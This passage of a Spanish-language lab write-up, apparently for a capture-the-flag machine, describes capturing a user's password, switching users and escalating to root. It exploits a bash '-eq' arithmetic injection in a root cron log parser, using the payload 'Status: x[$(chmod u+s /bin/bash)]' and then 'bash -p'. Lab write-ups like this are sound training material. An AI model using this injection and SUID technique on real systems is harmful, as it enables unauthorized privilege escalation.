+                <p>Poco después de registrar mi servicio malicioso, recibo una petición POST desde miranda-wise con sus credenciales de login:</p>
+                <pre><code class="language-plaintext">Received data: {'username': 'miranda.wise@furni.htb', 'password': 'IL!veT0Be&BeT0L0ve', '_csrf': 'Jyp8WCTjkk0PTDemDmuE3btDqn1f_ri3Vod2a4eGB24q5_ubQx9OPBGGoikiLlSUb0aw5N1xhxxnz9qaY-NHWrS0ZVoahMOv'}
+10.10.11.66 - - "POST /login HTTP/1.1" 200 -</code></pre>
+                
+                <p>Las credenciales capturadas son:</p>
+                <ul>
+                    <li>Usuario: <code>miranda-wise</code></li>
+                    <li>Contraseña: <code>IL!veT0Be&BeT0L0ve</code></li>
+                </ul>
+                
+                <h2>Movimiento Lateral - Acceso a Miranda-Wise</h2>
+                <p>Usando las credenciales capturadas, cambio al usuario miranda-wise:</p>
+                <pre><code class="language-bash">su miranda-wise</code></pre>
+                
+                <p>Autenticándome exitosamente como miranda-wise, ahora puedo recuperar la flag de usuario. Sin embargo, el servicio en el puerto 8081 resulta ser solo una interfaz mock de login sin funcionalidad real más allá de la autenticación.</p>
+                
+                <h2>Escalada de Privilegios - Monitorización de Procesos</h2>
+                <p>Habiendo agotado los vectores obvios de escalada de privilegios en el directorio home de miranda-wise, decido monitorizar procesos en ejecución para identificar tareas automatizadas. Transfiero <code>pspy64</code> a la máquina objetivo para observar la ejecución de procesos en tiempo real sin requerir privilegios de root.</p>
+                
+                <p>Tras ejecutar pspy64 durante unos minutos, observo varios procesos interesantes:</p>
+                <pre><code class="language-plaintext">CMD: UID=0 PID=771454 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh</code></pre>
+                
+                <p>Esto confirma el comportamiento automatizado de login que observé anteriormente. Más importante aún, noto otro proceso recurrente:</p>
+                <pre><code class="language-plaintext">CMD: UID=0 PID=771404 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
+CMD: UID=0 PID=771559 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log</code></pre>
+                
+                <p>El script <code>/opt/log_analyse.sh</code> está siendo ejecutado periódicamente por root (UID=0), procesando varios archivos de log de aplicación. Este es un potencial vector de escalada de privilegios si puedo controlar el contenido que procesa el script.</p>
+                
+                <h2>Análisis de Vulnerabilidad en Aritmética de Shell</h2>
+                <p>Comprobando los permisos en los directorios de logs, descubro que como miembro del grupo <code>developers</code>, tengo acceso de escritura:</p>
+                <pre><code class="language-bash">ls -la /var/www/web/cloud-gateway/log/</code></pre>
+                <pre><code class="language-plaintext">drwxrwxr-x 3 www-data developers 4096 Oct 15 13:03 .</code></pre>
+                
+                <p>Aunque no puedo modificar directamente los archivos de log existentes debido a restricciones de permisos, tengo control total sobre el directorio en sí. Esto significa que puedo eliminar y recrear archivos dentro de él.</p>
+                
+                <p>Examinando el script <code>/opt/log_analyse.sh</code>, me centro en encontrar potenciales oportunidades de inyección de comandos. El script no parece tener vulnerabilidades obvias de ejecución de comandos como <code>eval</code> o sustitución directa de comandos. Sin embargo, noto que usa el operador <code>-eq</code> para comparación aritmética.</p>
+                
+                <p>Tras investigar vulnerabilidades en aritmética de shell, descubro un artículo en Dev.to: <a href="https://dev.to/greymd/eq-can-be-critically-vulnerable-338m">"-eq puede ser críticamente vulnerable"</a>. Este artículo explica cómo la evaluación aritmética en bash puede ser explotada para inyección de comandos.</p>
+                
+                <h3>Entendiendo la Función Vulnerable</h3>
+                <p>La función vulnerable en <code>log_analyse.sh</code> se ve así:</p>
+                <p><img src="./media/image9.png" alt="Fragmento de código mostrando la función vulnerable usando grep con regex y comparación aritmética con operador -eq" /></p>
+                
+                <p>La función procesa cada línea del archivo de log, usando <code>grep</code> con una expresión regular para extraer valores que coincidan con el patrón <code>'Status *'</code>. El <code>\K</code> en la regex significa que solo captura la porción después de "Status ". Este valor extraído se guarda en la variable <code>$code</code> y luego se usa en una comparación aritmética con <code>-eq</code>.</p>
+                
+                <p>La vulnerabilidad crítica reside en cómo bash maneja la evaluación aritmética. Cuando bash encuentra <code>-eq</code>, evalúa las expresiones en ambos lados aritméticamente. Si la expresión contiene sintaxis de sustitución de comandos como <code>$(comando)</code>, bash ejecutará ese comando durante la fase de evaluación aritmética.</p>
+                
+                <h2>Explotación - Creando Entrada de Log Maliciosa</h2>
+                <p>Ya que no puedo editar el archivo <code>application.log</code> existente directamente pero tengo permisos completos sobre su directorio padre, mi enfoque es:</p>
+                <ol>
+                    <li>Eliminar el <code>application.log</code> existente</li>
+                    <li>Crear un nuevo <code>application.log</code> con contenido malicioso</li>
+                    <li>Esperar a que el cron job de root ejecute el script</li>
+                </ol>
+                
+                <p>Creo una entrada de log maliciosa que establecerá el bit SUID en <code>/bin/bash</code>, permitiéndome generar una shell de root:</p>
+                <pre><code class="language-bash">cd /var/www/web/cloud-gateway/log/
+rm application.log
+echo "Status: x[$(chmod u+s /bin/bash)]" > application.log</code></pre>
+                
+                <p>El payload <code>Status: x[$(chmod u+s /bin/bash)]</code> funciona porque cuando el script extrae todo después de "Status: " y lo usa en una comparación aritmética, bash evaluará <code>x[$(chmod u+s /bin/bash)]</code>. La sustitución de comandos <code>$(chmod u+s /bin/bash)</code> se ejecuta como root durante esta evaluación, estableciendo el bit SUID en bash.</p>
+                
+                <h2>Acceso Root - Explotación de Bash SUID</h2>
+                <p>Tras esperar a que el cron job se ejecute, verifico que el bit SUID ha sido establecido en <code>/bin/bash</code>:</p>
+                <pre><code class="language-bash">ls -la /bin/bash</code></pre>
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash</code></pre>
+                
+                <p>La 's' en los permisos confirma que el bit SUID está establecido. Ahora puedo generar una shell de root usando el modo privilegiado de bash:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>Ahora tengo acceso root y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
